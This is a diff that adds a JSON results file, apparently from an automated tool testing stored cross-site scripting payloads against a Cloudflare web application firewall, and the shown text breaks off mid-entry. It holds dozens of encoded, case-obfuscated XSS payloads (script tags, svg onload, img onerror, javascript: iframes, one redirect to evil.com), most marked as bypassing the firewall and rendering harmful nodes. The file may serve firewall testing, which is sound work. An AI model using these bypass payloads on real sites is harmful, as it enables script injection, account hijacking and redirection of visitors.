@@ -1,0 +1,1255 @@
+[
+    {
+        "payload": "%253CsCRIPT%253EALeRt%25281%2529%253C/scrIPT%253E",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<sCRIPT>ALeRt(1)</scrIPT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>ALeRt(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Cimg%250Asrc%253Dx%250Aonerror%253Dprompt%25281%2529%253E&jAqI=hZzt",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<img\nsrc=x\nonerror=prompt(1)>&jAqI=hZzt",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"prompt(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CIframesCRiPT%253EaLErT%25281%2529%253C/IFraMEscRIpT%253E",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IframesCRiPT>aLErT(1)</IFraMEscRIpT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframescript",
+                        "html": "<iframescript>aLErT(1)</iframescript>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Cimg%2520ONdrAGEnD%253D%2527top.location.href%253D%2527%252F%252Fevil.com%2527%2527%253Etest%253C/img%253E",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<img ONdrAGEnD='top.location.href='//evil.com''>test</img>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img ondragend=\"top.location.href=\" evil.com''=\"\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cSvG/oNloAD%253dALERt%25281%2529%253e",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SvG/oNloAD=ALERt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"ALERt(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253csvg/oNLOAD%253dALeRT%25281%2529%253E",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/oNLOAD=ALeRT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"ALeRT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cDIV%2520ONMOUSEMOVE%253d%2527sTRING.FROMcHARcODE%252899%252c111%252c110%252c102%252c105%252c114%252c109%2529%25281%2529%2527%253eTEST%253c%252fDIV%",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<DIV ONMOUSEMOVE='sTRING.FROMcHARcODE(99,111,110,102,105,114,109)(1)'>TEST</DIV%",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "div",
+                        "html": "<div onmousemove=\"sTRING.FROMcHARcODE(99,111,110,102,105,114,109)(1)\">TEST</div>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CiMG%250AsRC%253DX%250AoNeRRoR%253DaleRt%25281%2529%253E",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+obf_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<iMG\nsRC=X\noNeRRoR=aleRt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"X\" onerror=\"aleRt(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<SVG/ONMOUSEOVE%EF%BD\\%8F%D1%93R=ALERT(1)>",
+        "technique": "SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SVG/ONMOUSEOVE�\\�ѓR=ALERT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onmouseove�\\�ѓr=\"ALERT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cSvG/ONlOAd%253dalErT%25281%2529%253e",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SvG/ONlOAd=alErT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"alErT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253ciFraMe%252509SrC%253dJaVasCRIPT%253aAleRT%2560XSS%2560",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass+obf_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<iFraMe\tSrC=JaVasCRIPT:AleRT`XSS`",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cIMg%2520Src%253DX%2520oNerrOr%253dJAvaSCrIPt%253aALErt%2560xSs%2560%253e",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IMg Src=X oNerrOr=JAvaSCrIPt:ALErt`xSs`>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"X\" onerror=\"JAvaSCrIPt:ALErt`xSs`\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "ONMOUSEDOWN%3D",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "ONMOUSEDOWN=",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CsVg/oNloAd%253DalERT%25281%2529%253E",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<sVg/oNloAd=alERT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"alERT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cSCrIPt%253EALERt%25281%2529%253C/ScRipt%253e",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SCrIPt>ALERt(1)</ScRipt>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>ALERt(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cSCRIpT%253eALERT%25281%2529%253C/scRiPT%253E",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SCRIpT>ALERT(1)</scRiPT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>ALERT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Cimg%2520src%253Dx%2520onerror%253Dalert1%25281%2529%253E",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<img src=x onerror=alert1(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"alert1(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<svg/onmouseover%3Dalert%281%29> <img src=x oninvalid-input-%26solr%3Bbtn%20type=image+%26solr%3Bclass%3Dx table bordercolspan=4 cellspacing=3 cellpadding=5 id=t><tr %2A class = \"e2e-bad-guy\" /> <tbody><tr><td></td></tr></tbody></table></svg>//[\"'`-->]]>]</div>",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/onmouseover=alert(1)> <img src=x oninvalid-input-&solr;btn type=image+&solr;class=x table bordercolspan=4 cellspacing=3 cellpadding=5 id=t><tr * class = \"e2e-bad-guy\" /> <tbody><tr><td></td></tr></tbody></table></svg>//[\"'`-->]]>]</div>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onmouseover=\"alert(1)\"> </svg>"
+                    },
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" oninvalid-input-&solr;btn=\"\" type=\"image+&amp;solr;class=x\" table=\"\" bordercolspan=\"4\" cellspacing=\"3\" cellpadding=\"5\" id=\"t\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<div draggable=\"true\" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here peccato be testando%20...');confirm(1);//",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<div draggable=\"true\" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here peccato be testando ...');confirm(1);//",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "div",
+                        "html": "<div draggable=\"true\" contenteditable=\"\">drag me</div>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cIFRaME/%252a%252A/sRC%253djAvaSCRIpT%253AaLErt%25281%2529%253e",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRaME/**/sRC=jAvaSCRIpT:aLErt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe **=\"\" src=\"jAvaSCRIpT:aLErt(1)\"></iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CimG%2520sRC%253dx%2520onerROr%253daleRt%25281%2529%253E",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<imG sRC=x onerROr=aleRt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"aleRt(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Csvg/onloAD%253DALERT%25281%2529%253E&rFIU=ImHe",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+SVG onEvent_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/onloAD=ALERT(1)>&rFIU=ImHe",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"ALERT(1)\">&amp;rFIU=ImHe</svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CIFRaMe%2520sRC%253DjAvAScrIPt%253AALERt%25281%2529%253e",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRaMe sRC=jAvAScrIPt:ALERt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe src=\"jAvAScrIPt:ALERt(1)\"></iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25253cbodY%252520onload%25253daLeRT%2525281%252529%25253e",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<bodY onload=aLeRT(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CBODY/%252a%252A/ONLOAD%253daLeRt%25281%2529%253E",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<BODY/**/ONLOAD=aLeRt(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CSVG/oNloAD%253DALeRT%25281%2529%253E",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SVG/oNloAD=ALeRT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"ALeRT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<details%20onmousemove='alert(1)'>IMg/%253cBOdy/ONlOad=alerT%25281976%2529%253E</details>",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<details onmousemove='alert(1)'>IMg/<BOdy/ONlOad=alerT(1976)></details>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "details",
+                        "html": "<details onmousemove=\"alert(1)\">IMg/</details>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CSVG/ONLOAD%253DAlErT%25281%2529%253E",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SVG/ONLOAD=AlErT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"AlErT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cIFrAME/%252a%252A/sRC%253DJavAsCRIpt%253AaLErt%25281%2529%253e",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFrAME/**/sRC=JavAsCRIpt:aLErt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe **=\"\" src=\"JavAsCRIpt:aLErt(1)\"></iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<!-- ｏｎＣｌｉｃｋ= --><img src=x onerror=alert(1)>",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<!-- onClick= --><img src=x onerror=alert(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"alert(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cSVG/ONLOAD%253daLeRT%25281%2529%253e",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SVG/ONLOAD=aLeRT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"aLeRT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%26%2347%3Bbody%25a0onload%253Dalert%2891%29%25A0open%26%2347%3B",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "/body%aOonload=alert(91)%AOopen/",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "ONMoUseovEr= --%20",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "ONMoUseovEr= -- ",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cifRAme%2520SRc%253dJaVasCRipT%253AaleRT%25281%2529%253e",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<ifRAme SRc=JaVasCRipT:aleRT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe src=\"JaVasCRipT:aleRT(1)\"></iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Csvg/onmouseover%253Dalert1948%25281%2529%253Etest_%253C/sVg%253e",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/onmouseover=alert1948(1)>test_</sVg>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onmouseover=\"alert1948(1)\">test_</svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25253CscriPt%25253EAlERT%2525281%252529%25253c/sCRiPT%25253e",
+        "technique": "obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<scriPt>AlERT(1)</sCRiPT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>AlERT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cIfrAME%2520Src%253dJavAScrIPT%253aALErt%25281%2529%253e",
+        "technique": "SVG onEvent_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IfrAME Src=JavAScrIPT:ALErt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe src=\"JavAScrIPT:ALErt(1)\"></iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Csvg/oNlOad%253DaLeRt%25281%2529%253E",
